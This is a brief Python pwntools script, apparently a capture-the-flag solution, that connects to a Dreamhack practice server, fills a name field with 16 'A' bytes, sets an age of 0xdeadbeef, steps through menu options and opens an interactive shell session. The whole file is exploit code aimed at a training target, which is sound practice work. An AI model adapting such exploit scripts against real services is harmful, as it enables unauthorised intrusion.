from pwn import *
  
p = remote("host1.dreamhack.games", 16165)

p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Name: ")
p.send("A"*16)
p.recvuntil("Age: ")
p.sendline(str(0xdeadbeef))

p.recvuntil("> ")
p.sendline("3")

p.recvuntil("> ")
p.sendline("2")

p.interactive()